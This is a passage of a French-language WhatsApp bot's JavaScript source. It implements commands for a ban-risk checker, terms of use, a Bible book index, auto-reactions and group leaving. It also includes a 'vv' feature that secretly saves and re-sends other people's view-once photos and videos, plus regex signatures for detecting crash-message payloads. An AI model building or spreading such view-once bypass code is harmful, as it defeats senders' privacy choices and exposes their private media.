${getRiskRecommendation(riskLevel)}

━━━━━━━━━━━━━━━━━━━━━━━━━
*État du système: Base de données synchronisée*
🇷🇴 SEIGNEUR TD 🇷🇴`;

    // Supprimer le message de chargement et envoyer le résultat
    await sock.sendMessage(remoteJid, { delete: loadingMsg.key });
    await sock.sendMessage(remoteJid, { text: resultText });

  } catch (error) {
    console.error('Erreur handleCheckBan:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Erreur lors de la vérification*\n\nDétails: ${error.message}`
    });
  }
}

// Fonction helper pour déterminer le pays
function getCountryFromNumber(number) {
  const prefixes = {
    '1': '🇺🇸 USA/Canada',
    '33': '🇫🇷 France',
    '235': '🇹🇩 Tchad',
    '509': '🇭🇹 Haiti',
    '44': '🇬🇧 UK',
    '62': '🇮🇩 Indonesia',
    '91': '🇮🇳 India',
    '55': '🇧🇷 Brazil',
    '234': '🇳🇬 Nigeria',
    '254': '🇰🇪 Kenya',
    '27': '🇿🇦 South Africa'
  };

  for (const [prefix, country] of Object.entries(prefixes)) {
    if (number.startsWith(prefix)) {
      return country;
    }
  }
  return '🌍 International';
}

// Fonction helper pour les recommandations
function getRiskRecommendation(risk) {
  if (risk >= 70) {
    return `🚨 *HAUTE ALERTE*
⚠️ Ce numéro présente des signes de ban/spam
❌ Évitez d'interagir with ce contact
🛡️ Recommandation: BLOQUER`;
  } else if (risk >= 40) {
    return `⚠️ *VIGILANCE REQUISE*
⚡ Risque modéré détecté
🔍 Vérifiez l'identité avant d'interagir
🛡️ Recommandation: PRUDENCE`;
  } else {
    return `✅ *SÉCURISÉ*
🟢 Aucun signe de ban/spam détecté
✔️ Vous pouvez interagir normalement
🛡️ Recommandation: OK`;
  }
}

// TERMES ET CONDITIONS
async function handleTermsCommand(sock, remoteJid, senderJid) {
  const userName = senderJid.split('@')[0];
  
  const termsText = `╔═══════════════════════════════════╗
║  📜 𝗧𝗘𝗥𝗠𝗘𝗦 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦  ║
╚═══════════════════════════════════╝

⚠️ **RÈGLES D'UTILISATION DU BOT**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **1. UTILISATION RESPONSABLE**

• Le bot est fourni "tel quel" sans garantie
• L'utilisateur est responsable de son usage
• Toute utilisation abusive est interdite
• Respectez les autres utilisateurs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚫 **2. INTERDICTIONS STRICTES**

• ❌ Spam ou flood de commandes
• ❌ Contenu illégal ou offensant
• ❌ Harcèlement d'autres membres
• ❌ Utilisation pour escroquerie
• ❌ Diffusion de malware/virus
• ❌ Contournement des restrictions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 **3. DONNÉES & CONFIDENTIALITÉ**

• Vos messages ne sont pas stockés
• Les commandes sont temporaires
• Aucune donnée vendue à des tiers
• Logs techniques uniquement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ **4. RESPONSABILITÉ LÉGALE**

• Le développeur n'est pas responsable:
  - De l'usage que vous faites du bot
  - Des dommages causés par le bot
  - Des interruptions de service
  - Des pertes de données

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👮 **5. MODÉRATION**

Le développeur se réserve le droit de:
• Bannir tout utilisateur abusif
• Modifier les fonctionnalités
• Suspendre le service
• Supprimer du contenu inapproprié

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **6. PROPRIÉTÉ INTELLECTUELLE**

• Le bot et son code sont protégés
• Redistribution interdite sans accord
• Modification du code interdite
• Crédits obligatoires

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **7. MODIFICATIONS**

Ces termes peuvent être modifiés à tout
moment sans préavis. Votre utilisation
continue constitue votre acceptation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **ACCEPTATION**

En utilisant ce bot, vous acceptez
pleinement ces termes et conditions.

Si vous n'acceptez pas, cessez
immédiatement d'utiliser le bot.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 **CONTACT & SUPPORT**

• Dev: SEIGNEUR TD 🇷🇴
• Bot: SEIGNEUR TD 🇷🇴 v4.0.0
• Pour signaler un problème: 
  Contactez l'administrateur

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
"Utilisez with sagesse et respect"

✦ Dernière mise à jour: 06/02/2026`;

  await sock.sendMessage(remoteJid, {
    text: termsText,
    mentions: [senderJid]
  });
}

// BIBLE - Base de données complète des livres de la Bible
async function handleBibleCommand(sock, args, remoteJid) {
  // Ancien Testament (39 livres)
  const ancienTestament = {
    'genese': { nom: 'Genèse', chapitres: 50, testament: 'Ancien' },
    'exode': { nom: 'Exode', chapitres: 40, testament: 'Ancien' },
    'levitique': { nom: 'Lévitique', chapitres: 27, testament: 'Ancien' },
    'nombres': { nom: 'Nombres', chapitres: 36, testament: 'Ancien' },
    'deuteronome': { nom: 'Deutéronome', chapitres: 34, testament: 'Ancien' },
    'josue': { nom: 'Josué', chapitres: 24, testament: 'Ancien' },
    'juges': { nom: 'Juges', chapitres: 21, testament: 'Ancien' },
    'ruth': { nom: 'Ruth', chapitres: 4, testament: 'Ancien' },
    '1samuel': { nom: '1 Samuel', chapitres: 31, testament: 'Ancien' },
    '2samuel': { nom: '2 Samuel', chapitres: 24, testament: 'Ancien' },
    '1rois': { nom: '1 Rois', chapitres: 22, testament: 'Ancien' },
    '2rois': { nom: '2 Rois', chapitres: 25, testament: 'Ancien' },
    '1chroniques': { nom: '1 Chroniques', chapitres: 29, testament: 'Ancien' },
    '2chroniques': { nom: '2 Chroniques', chapitres: 36, testament: 'Ancien' },
    'esdras': { nom: 'Esdras', chapitres: 10, testament: 'Ancien' },
    'nehemie': { nom: 'Néhémie', chapitres: 13, testament: 'Ancien' },
    'esther': { nom: 'Esther', chapitres: 10, testament: 'Ancien' },
    'job': { nom: 'Job', chapitres: 42, testament: 'Ancien' },
    'psaumes': { nom: 'Psaumes', chapitres: 150, testament: 'Ancien' },
    'proverbes': { nom: 'Proverbes', chapitres: 31, testament: 'Ancien' },
    'ecclesiaste': { nom: 'Ecclésiaste', chapitres: 12, testament: 'Ancien' },
    'cantique': { nom: 'Cantique des Cantiques', chapitres: 8, testament: 'Ancien' },
    'esaie': { nom: 'Ésaïe', chapitres: 66, testament: 'Ancien' },
    'jeremie': { nom: 'Jérémie', chapitres: 52, testament: 'Ancien' },
    'lamentations': { nom: 'Lamentations', chapitres: 5, testament: 'Ancien' },
    'ezechiel': { nom: 'Ézéchiel', chapitres: 48, testament: 'Ancien' },
    'daniel': { nom: 'Daniel', chapitres: 12, testament: 'Ancien' },
    'osee': { nom: 'Osée', chapitres: 14, testament: 'Ancien' },
    'joel': { nom: 'Joël', chapitres: 3, testament: 'Ancien' },
    'amos': { nom: 'Amos', chapitres: 9, testament: 'Ancien' },
    'abdias': { nom: 'Abdias', chapitres: 1, testament: 'Ancien' },
    'jonas': { nom: 'Jonas', chapitres: 4, testament: 'Ancien' },
    'michee': { nom: 'Michée', chapitres: 7, testament: 'Ancien' },
    'nahum': { nom: 'Nahum', chapitres: 3, testament: 'Ancien' },
    'habacuc': { nom: 'Habacuc', chapitres: 3, testament: 'Ancien' },
    'sophonie': { nom: 'Sophonie', chapitres: 3, testament: 'Ancien' },
    'aggee': { nom: 'Aggée', chapitres: 2, testament: 'Ancien' },
    'zacharie': { nom: 'Zacharie', chapitres: 14, testament: 'Ancien' },
    'malachie': { nom: 'Malachie', chapitres: 4, testament: 'Ancien' }
  };

  // Nouveau Testament (27 livres)
  const nouveauTestament = {
    'matthieu': { nom: 'Matthieu', chapitres: 28, testament: 'Nouveau' },
    'marc': { nom: 'Marc', chapitres: 16, testament: 'Nouveau' },
    'luc': { nom: 'Luc', chapitres: 24, testament: 'Nouveau' },
    'jean': { nom: 'Jean', chapitres: 21, testament: 'Nouveau' },
    'actes': { nom: 'Actes des Apôtres', chapitres: 28, testament: 'Nouveau' },
    'romains': { nom: 'Romains', chapitres: 16, testament: 'Nouveau' },
    '1corinthiens': { nom: '1 Corinthiens', chapitres: 16, testament: 'Nouveau' },
    '2corinthiens': { nom: '2 Corinthiens', chapitres: 13, testament: 'Nouveau' },
    'galates': { nom: 'Galates', chapitres: 6, testament: 'Nouveau' },
    'ephesiens': { nom: 'Éphésiens', chapitres: 6, testament: 'Nouveau' },
    'philippiens': { nom: 'Philippiens', chapitres: 4, testament: 'Nouveau' },
    'colossiens': { nom: 'Colossiens', chapitres: 4, testament: 'Nouveau' },
    '1thessaloniciens': { nom: '1 Thessaloniciens', chapitres: 5, testament: 'Nouveau' },
    '2thessaloniciens': { nom: '2 Thessaloniciens', chapitres: 3, testament: 'Nouveau' },
    '1timothee': { nom: '1 Timothée', chapitres: 6, testament: 'Nouveau' },
    '2timothee': { nom: '2 Timothée', chapitres: 4, testament: 'Nouveau' },
    'tite': { nom: 'Tite', chapitres: 3, testament: 'Nouveau' },
    'philemon': { nom: 'Philémon', chapitres: 1, testament: 'Nouveau' },
    'hebreux': { nom: 'Hébreux', chapitres: 13, testament: 'Nouveau' },
    'jacques': { nom: 'Jacques', chapitres: 5, testament: 'Nouveau' },
    '1pierre': { nom: '1 Pierre', chapitres: 5, testament: 'Nouveau' },
    '2pierre': { nom: '2 Pierre', chapitres: 3, testament: 'Nouveau' },
    '1jean': { nom: '1 Jean', chapitres: 5, testament: 'Nouveau' },
    '2jean': { nom: '2 Jean', chapitres: 1, testament: 'Nouveau' },
    '3jean': { nom: '3 Jean', chapitres: 1, testament: 'Nouveau' },
    'jude': { nom: 'Jude', chapitres: 1, testament: 'Nouveau' },
    'apocalypse': { nom: 'Apocalypse', chapitres: 22, testament: 'Nouveau' }
  };

  const touteLaBible = { ...ancienTestament, ...nouveauTestament };

  // Si aucun argument, afficher le menu
  if (!args[0]) {
    const menuText = `╔═══════════════════════════════════╗
║       📖 𝗟𝗔 𝗦𝗔𝗜𝗡𝗧𝗘 𝗕𝗜𝗕𝗟𝗘       ║
╚═══════════════════════════════════╝

📚 *Utilisation:*
!bible ancien - Ancien Testament (39 livres)
!bible nouveau - Nouveau Testament (27 livres)
!bible liste - Liste complète (66 livres)
!bible [livre] - Info sur un livre

📝 *Exemples:*
!bible genese
!bible matthieu
!bible psaumes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
"La parole de Dieu est vivante"`;

    await sendWithImage(sock, remoteJid, 'bible', menuText);
    return;
  }

  const commande = args[0].toLowerCase();

  // Liste de l'Ancien Testament
  if (commande === 'ancien') {
    let texte = `╔═══════════════════════════════════╗
║   📜 𝗔𝗡𝗖𝗜𝗘𝗡 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧    ║
╚═══════════════════════════════════╝

📚 *39 livres de l'Ancien Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PENTATEUQUE (5):*
1. Genèse (50 ch.)
2. Exode (40 ch.)
3. Lévitique (27 ch.)
4. Nombres (36 ch.)
5. Deutéronome (34 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES HISTORIQUES (12):*
6. Josué (24 ch.)
7. Juges (21 ch.)
8. Ruth (4 ch.)
9. 1 Samuel (31 ch.)
10. 2 Samuel (24 ch.)
11. 1 Rois (22 ch.)
12. 2 Rois (25 ch.)
13. 1 Chroniques (29 ch.)
14. 2 Chroniques (36 ch.)
15. Esdras (10 ch.)
16. Néhémie (13 ch.)
17. Esther (10 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES POÉTIQUES (5):*
18. Job (42 ch.)
19. Psaumes (150 ch.)
20. Proverbes (31 ch.)
21. Ecclésiaste (12 ch.)
22. Cantique des Cantiques (8 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *GRANDS PROPHÈTES (5):*
23. Ésaïe (66 ch.)
24. Jérémie (52 ch.)
25. Lamentations (5 ch.)
26. Ézéchiel (48 ch.)
27. Daniel (12 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PETITS PROPHÈTES (12):*
28. Osée (14 ch.)
29. Joël (3 ch.)
30. Amos (9 ch.)
31. Abdias (1 ch.)
32. Jonas (4 ch.)
33. Michée (7 ch.)
34. Nahum (3 ch.)
35. Habacuc (3 ch.)
36. Sophonie (3 ch.)
37. Aggée (2 ch.)
38. Zacharie (14 ch.)
39. Malachie (4 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste du Nouveau Testament
  if (commande === 'nouveau') {
    let texte = `╔═══════════════════════════════════╗
║   ✝️ 𝗡𝗢𝗨𝗩𝗘𝗔𝗨 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧  ║
╚═══════════════════════════════════╝

📚 *27 livres du Nouveau Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉVANGILES (4):*
1. Matthieu (28 ch.)
2. Marc (16 ch.)
3. Luc (24 ch.)
4. Jean (21 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *HISTOIRE (1):*
5. Actes des Apôtres (28 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES DE PAUL (13):*
6. Romains (16 ch.)
7. 1 Corinthiens (16 ch.)
8. 2 Corinthiens (13 ch.)
9. Galates (6 ch.)
10. Éphésiens (6 ch.)
11. Philippiens (4 ch.)
12. Colossiens (4 ch.)
13. 1 Thessaloniciens (5 ch.)
14. 2 Thessaloniciens (3 ch.)
15. 1 Timothée (6 ch.)
16. 2 Timothée (4 ch.)
17. Tite (3 ch.)
18. Philémon (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES GÉNÉRALES (8):*
19. Hébreux (13 ch.)
20. Jacques (5 ch.)
21. 1 Pierre (5 ch.)
22. 2 Pierre (3 ch.)
23. 1 Jean (5 ch.)
24. 2 Jean (1 ch.)
25. 3 Jean (1 ch.)
26. Jude (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *APOCALYPSE (1):*
27. Apocalypse (22 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste complète
  if (commande === 'liste') {
    let texte = `╔═══════════════════════════════════╗
║     📖 𝗟𝗔 𝗕𝗜𝗕𝗟𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘    ║
╚═══════════════════════════════════╝

📊 *Composition de la Bible:*

📜 Ancien Testament: 39 livres
✝️ Nouveau Testament: 27 livres
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📚 *TOTAL: 66 livres*

💡 *Pour voir la liste détaillée:*
• !bible ancien - Voir les 39 livres
• !bible nouveau - Voir les 27 livres

📖 *Pour info sur un livre:*
• !bible [nom du livre]
• Exemple: !bible genese

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *Quelques statistiques:*
• Plus long livre: Psaumes (150 ch.)
• Plus court: 2 Jean, 3 Jean, Jude (1 ch.)
• Premier livre: Genèse
• Dernier livre: Apocalypse

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
"Toute Écriture est inspirée de Dieu"`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Recherche d'un livre spécifique
  const livreRecherche = commande.toLowerCase().replace(/\s/g, '');
  const livre = touteLaBible[livreRecherche];

  if (livre) {
    const testament = livre.testament === 'Ancien' ? '📜 Ancien Testament' : '✝️ Nouveau Testament';
    const texte = `╔═══════════════════════════════════╗
║        📖 ${livre.nom.toUpperCase()}        ║
╚═══════════════════════════════════╝

${testament}

📊 *Informations:*
• Nombre de chapitres: ${livre.chapitres}
• Testament: ${livre.testament}

💡 *Pour lire ce livre:*
Utilisez votre Bible ou une application
de lecture biblique.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
  } else {
    await sock.sendMessage(remoteJid, {
      text: `❌ Livre "${args[0]}" non trouvé.\n\nUtilisez !bible liste pour voir tous les livres disponibles.`
    });
  }
}

async function handleLeave(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdminOrOwner()) {
    await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
    return;
  }

  await sock.sendMessage(remoteJid, { 
    text: `\u250C\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2510
Sayonara everyone
\u2514\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2518
\uD83D\uDCA0 _Bot leave. See you soon!_`
  });
  await delay(2000);
  await sock.groupLeave(remoteJid);
}

async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
  if (!isAdminOrOwner()) {
    await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
    return;
  }

  if (args.length === 0) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *Auto-React*\n\nStatut: ${autoReact ? '✅ ON' : '❌ OFF'}\n\n${config.prefix}autoreact on/off\n${config.prefix}autoreact list\n${config.prefix}autoreact add <mot> <emoji>\n${config.prefix}autoreact remove <mot>`
    });
    return;
  }

  const subCommand = args[0].toLowerCase();

  switch (subCommand) {
    case 'on':
      autoReact = true;
      saveData();
      await sock.sendMessage(remoteJid, { text: '✅ Auto-React ACTIVÉ' });
      break;

    case 'off':
      autoReact = false;
      saveData();
      await sock.sendMessage(remoteJid, { text: '❌ Auto-React DÉSACTIVÉ' });
      break;

    case 'list':
      const wordList = Object.entries(autoreactWords)
        .map(([word, emoji]) => `• ${word} → ${emoji}`)
        .join('\n');
      await sock.sendMessage(remoteJid, {
        text: `📝 *Mots*:\n\n${wordList || 'Aucun'}`
      });
      break;

    case 'add':
      if (args.length < 3) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact add <mot> <emoji>`
        });
        return;
      }
      const wordToAdd = args[1].toLowerCase();
      const emojiToAdd = args.slice(2).join(' ');
      autoreactWords[wordToAdd] = emojiToAdd;
      saveData();
      await sock.sendMessage(remoteJid, {
        text: `✅ Ajouté: "${wordToAdd}" → ${emojiToAdd}`
      });
      break;

    case 'remove':
      if (args.length < 2) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact remove <mot>`
        });
        return;
      }
      const wordToRemove = args[1].toLowerCase();
      if (autoreactWords[wordToRemove]) {
        delete autoreactWords[wordToRemove];
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✅ Supprimé: "${wordToRemove}"`
        });
      } else {
        await sock.sendMessage(remoteJid, {
          text: `❌ Mot non trouvé`
        });
      }
      break;

    default:
      await sock.sendMessage(remoteJid, {
        text: `❌ Sous-commande inconnue`
      });
  }
}

async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // ─── VV (sans argument ou "last") = plusieurs cas ────────────────────────
  if (!sub || sub === 'last') {

    // CAS 1 : L'user répond (!vv en reply) à un message avec média → l'extraire directement
    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (quoted) {
      try {
        let mediaData = null, mediaType = '', mimetype = '', isGif = false;

        // Vérifier si c'est un viewOnce en reply
        const qViewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessageV2Extension;
        const qImage    = qViewOnce?.message?.imageMessage || quoted.imageMessage;
        const qVideo    = qViewOnce?.message?.videoMessage || quoted.videoMessage;

        if (qImage) {
          mediaType = 'image'; mimetype = qImage.mimetype || 'image/jpeg';
          const stream = await downloadContentFromMessage(qImage, 'image');
          mediaData = await toBuffer(stream);
        } else if (qVideo) {
          mediaType = 'video'; mimetype = qVideo.mimetype || 'video/mp4';
          isGif = qVideo.gifPlayback || false;
          const stream = await downloadContentFromMessage(qVideo, 'video');
          mediaData = await toBuffer(stream);
        }

        if (mediaData && mediaData.length > 100) {
          await sendVVMedia(sock, remoteJid, {
            type: mediaType, buffer: mediaData, mimetype, isGif, ptt: false,
            timestamp: Date.now(), sender: senderJid, size: mediaData.length, fromJid: senderJid
          }, 1, 1);
          return;
        }
      } catch(e) {
        console.error('[VV reply extract]', e.message);
      }
    }

    // CAS 2 : Chercher dans le cache View Once auto-sauvegardé
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    if (all.length === 0) {
      await sock.sendMessage(remoteJid, {
        text: `👁️ *Vue Unique*

❌ *Aucun média sauvegardé*

📌 *Comment utiliser cet outil ?*

*Méthode 1:* Envoie-moi une photo ou vidéo en "Vue Unique" et je la sauvegarderai automatiquement
*Méthode 2:* Réponds à n'importe quelle photo/vidéo avec \`!vv\` pour l'extraire directement

📋 *Commandes:*
• \`!vv\` — Dernier média sauvegardé
• \`!vv list\` — liste complète
• \`!vv get 1\` — Récupérer par numéro`
      });
      return;
    }
    all.sort((a, b) => b.timestamp - a.timestamp);
    await sendVVMedia(sock, remoteJid, all[0], 1, all.length);
    return;
  }

  // ─── VV LIST ────────────────────────────────────────────────────────────────
  if (sub === 'list') {
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (all.length === 0) {
      await sock.sendMessage(remoteJid, {
        text: `👁️ *Liste Vue Unique*\n\n📭 Aucun média sauvegardé`
      });
      return;
    }

    let listText = `┏━━━  👁️ Liste Vue Unique  👁️  ━━━┓\n\n`;
    listText += `📦 *Total Sauvegardes: ${all.length}*\n\n`;
    all.forEach((item, i) => {
      const date = new Date(item.timestamp).toLocaleString('ar-SA', {
        timeZone: 'Africa/Ndjamena',
        day: '2-digit', month: '2-digit',
        hour: '2-digit', minute: '2-digit'
      });
      const icon = item.type === 'image' ? '📸' : item.type === 'video' ? '🎥' : '🎵';
      const from = item.fromJid.split('@')[0];
      listText += `${icon} *${i + 1}.* De: +${from}\n   📅 ${date}\n   📏 ${(item.size / 1024).toFixed(0)} KB\n\n`;
    });
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📌 *Pour récupérer:* ${config.prefix}vv get [numéro]\n`;
    listText += `📌 *Dernier:* ${config.prefix}vv last\n`;
    listText += `📌 *Suppression:* ${config.prefix}vv clear\n`;
    listText += `📌 *Supprimer un:* ${config.prefix}vv del [numéro]`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // ─── VV GET <n> ─────────────────────────────────────────────────────────────
  if (sub === 'get') {
    const idx = parseInt(args[1]) - 1;
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach(item => all.push({ ...item, fromJid: jid }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (isNaN(idx) || idx < 0 || idx >= all.length) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Numéro invalide\n\nUtilisation: ${config.prefix}vv get 1\nPlage: 1 - ${all.length}`
      });
      return;
    }

    await sendVVMedia(sock, remoteJid, all[idx], idx + 1, all.length);
    return;
  }

  // ─── VV DEL <n> ─────────────────────────────────────────────────────────────
  if (sub === 'del' && args[1]) {
    const idx = parseInt(args[1]) - 1;
    const all = [];
    for (const [jid, items] of savedViewOnce.entries()) {
      items.forEach((item, i) => all.push({ ...item, fromJid: jid, arrIdx: i }));
    }
    all.sort((a, b) => b.timestamp - a.timestamp);

    if (isNaN(idx) || idx < 0 || idx >= all.length) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Numéro invalide (1 - ${all.length})`
      });
      return;
    }

    const target = all[idx];
    const userArr = savedViewOnce.get(target.fromJid) || [];
    userArr.splice(target.arrIdx, 1);
    if (userArr.length === 0) savedViewOnce.delete(target.fromJid);
    else savedViewOnce.set(target.fromJid, userArr);
    saveStoreKey('viewonce');

    await sock.sendMessage(remoteJid, {
      text: `✅ Élément supprimé #${idx + 1} de la liste`
    });
    return;
  }

  // ─── VV CLEAR ───────────────────────────────────────────────────────────────
  if (sub === 'clear') {
    const total = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
    savedViewOnce.clear();
    saveStoreKey('viewonce');
    await sock.sendMessage(remoteJid, {
      text: `🗑️ Tous les médias supprimés (${total} fichier(s))`
    });
    return;
  }

  // ─── VV HELP ────────────────────────────────────────────────────────────────
  await sock.sendMessage(remoteJid, {
    text: `┏━━━  👁️ View Once Help  👁️  ━━━┓

📌 *Commandes disponibles:*

👁️ ${config.prefix}vv           → Dernier média sauvegardé
📋 ${config.prefix}vv list       → Liste de tous les médias
📥 ${config.prefix}vv get [n]    → Récupérer par numéro
🗑️ ${config.prefix}vv del [n]    → Supprimer par numéro
🧹 ${config.prefix}vv clear      → Tout supprimer
🕐 ${config.prefix}vv last       → Dernier

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📦 Sauvegardes: ${[...savedViewOnce.values()].reduce((s,a) => s+a.length, 0)}

✨ Sauvegarde automatique à la réception de
tout média Vue Unique

🇷🇴 SEIGNEUR TD 🇷🇴`
  });
}

// Envoyer un média VV with infos
async function sendVVMedia(sock, remoteJid, item, num, total) {
  try {
    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
      timeZone: 'Africa/Ndjamena',
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    const from = item.fromJid.split('@')[0];
    const caption = `┏━ 💎 Bᴇᴀᴜᴛé\n┃━ 💸 Pᴀᴜᴠʀᴇᴛé\n┗━ 🤝 Fɪᴅéʟɪᴛé\n\n░ L E  S E I G N E U R  D E S  A P P A R E I L S 😍 🇷🇴`;

    if (item.type === 'image') {
      await sock.sendMessage(remoteJid, {
        image: item.buffer,
        caption
      });
    } else if (item.type === 'video') {
      await sock.sendMessage(remoteJid, {
        video: item.buffer,
        caption,
        gifPlayback: item.isGif || false
      });
    } else if (item.type === 'audio') {
      await sock.sendMessage(remoteJid, {
        audio: item.buffer,
        ptt: item.ptt || false,
        mimetype: item.mimetype || 'audio/ogg; codecs=opus'
      });
      await sock.sendMessage(remoteJid, { text: caption });
    }
  } catch (e) {
    console.error('Erreur sendVVMedia:', e);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors de l'envoi du média: ${e.message}` });
  }
}

// =============================================
// 🛡️ SYSTÈME ANTI-BUG COMPLET
// =============================================

// Signatures de payloads malveillants connus
const BUG_SIGNATURES = {
  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
  // Flood d'emojis (>200 emojis consécutifs)
  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
  // Caractères invisibles en masse (zero-width)
  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
  // Zalgo / caractères combinants excessifs
  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
  // Chaînes extrêmement longues (>5000 chars d'un seul message)
  massiveText: null, // géré par longueur
  // Caractères CJK en masse (chinois crashant)
  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
  // RTL override massif
  rtlOverride: /\u202E{3,}/,
  // Null bytes / caractères de contrôle
  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
};

// Détection dans le contenu du message (texte + métadonnées)
function detectBugPayload(message, messageText) {
  try {
    // 1. Analyser le texte principal
    const text = messageText || '';

    // Longueur excessive
    if (text.length > 5000) {
      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
    }

    // Vérifier chaque signature
    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
      if (regex && regex.test(text)) {
        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
      }
    }

    // 2. Analyser les métadonnées du message (contextInfo malveillant)
    const ctx = message.message?.extendedTextMessage?.contextInfo;
    if (ctx) {
      // Thumbnail URL corrompue
      const extAd = ctx.externalAdReply;
      if (extAd) {
        const title = extAd.title || '';
        const body = extAd.body || '';
        if (title.length > 2000 || body.length > 2000) {
          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
        }
        // Vérifier les payloads dans le titre/body
        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
          if (regex && (regex.test(title) || regex.test(body))) {
            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
          }
        }
      }
    }

    // 3. Détecter les messages viewOnce with contenu malveillant
    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
    if (vv) {
      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
      if (innerCtx?.title?.length > 1000) {
        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
      }
    }

    // 4. Détecter les stickers malveillants (payload dans webpUrl)
    const sticker = message.message?.stickerMessage;
    if (sticker?.url && sticker.url.length > 500) {
